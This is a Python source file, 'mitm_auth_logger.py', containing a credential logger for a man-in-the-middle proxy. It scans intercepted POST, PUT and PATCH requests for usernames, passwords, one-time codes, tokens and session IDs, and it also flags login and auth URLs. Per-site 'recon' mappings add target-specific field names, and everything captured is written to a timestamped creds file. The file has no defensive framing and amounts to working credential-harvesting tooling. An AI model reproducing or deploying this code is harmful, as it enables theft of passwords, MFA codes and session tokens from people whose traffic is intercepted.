
# mitm_auth_logger.py
import json
import os
import logging
from typing import Any
from urllib.parse import urlparse
from datetime import datetime, timezone

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

class CredentialsLogger:
    def __init__(self, log_output_file=None, mapping_config_file=None):
        if mapping_config_file is None:
            mapping_config_file = "site_mapping.json"
        if log_output_file is None:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            self.log_output_file = f"creds_{timestamp}.json"
        else:
            self.log_output_file = log_output_file

        # Discard these common non-credential keys
        self.noise_blacklist = {"utf8", "authenticity_token", "button", "submit", "csrf"}
        
        # Default global triggers
        self.global_credential_triggers = {
            "user", "username", "email", "pass", "password", 
            "passwd", "code", "otp", "token", "sid", "secret"
        }
        self.auth_path_keywords = ("login", "auth", "signin", "verify", "session")
        
        # Load custom mappings
        self.site_specific_mappings = self._load_recon_mappings(mapping_config_file)

    def _load_recon_mappings(self, config_path: str) -> dict:
        try:
            if os.path.exists(config_path):
                with open(config_path, "r") as config_file:
                    return json.load(config_file)
        except Exception as error_loading:
            logging.error(f"Error loading mapping file: {error_loading}")
        return {}

    def _append_to_log(self, log_entry: dict):
        try:
            with open(self.log_output_file, "a") as output_stream:
                output_stream.write(json.dumps(log_entry) + "\n")
        except Exception as write_error:
            logging.error(f"Failed to write to log file: {write_error}")

    def filter_noise(self, field_name: str) -> bool:
        """Determines if a field is likely junk data."""
        if len(str(field_name)) < 3:
            return True
        return field_name.lower() in self.noise_blacklist

    def extract_relevant_data(self, request_payload: Any, target_domain: str = None) -> dict:
        captured_credentials = {}
        
        # Combine global + site-specific triggers
        active_target_keys = self.global_credential_triggers.copy()
        if target_domain and target_domain in self.site_specific_mappings:
            active_target_keys.update(self.site_specific_mappings[target_domain])

        if isinstance(request_payload, dict):
            for field_key, field_val in request_payload.items():
                is_target = any(trigger in str(field_key).lower() for trigger in active_target_keys)
                
                if is_target and not self.filter_noise(field_key):
                    captured_credentials[field_key] = field_val
                elif isinstance(field_val, (dict, list)):
                    captured_credentials.update(self.extract_relevant_data(field_val, target_domain))
                    
        elif isinstance(request_payload, list):
            for list_item in request_payload:
                captured_credentials.update(self.extract_relevant_data(list_item, target_domain))
                
        return captured_credentials

    def process_event(self, event_type: str, request_url: str, request_method: str, request_payload: Any, proxy_session_id: str = "N/A"):
        """Analyzes the URL and payload to decide what to log."""
        target_host = urlparse(request_url).netloc
        
        # Determine if this looks like a credential submission
        auth_action = any(keyword in request_url.lower() for keyword in self.auth_path_keywords)
        data_submission = request_method.upper() in ("POST", "PUT", "PATCH")

        # Parse string/bytes payload into dict if possible
        if isinstance(request_payload, (str, bytes)):
            try:
                request_payload = json.loads(request_payload)
            except:
                pass 

        extracted_data = self.extract_relevant_data(request_payload, target_host)

        # Logic: Log if we found keys OR if it's an auth path being used to submit data
        if extracted_data or (auth_action and data_submission):
            structured_log_entry = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "session_id": proxy_session_id,
                "event_type": event_type,
                "method": request_method,
                "target_url": request_url,
                "captured_credentials": extracted_data or "[Auth Path Hit - No Body Data]"
            }
            self._append_to_log(structured_log_entry)
            logging.info(f"Captured event from {target_host} (Type: {event_type})")

# Initialize for use
if __name__ == "__main__":
    credentials_logger = CredentialsLogger()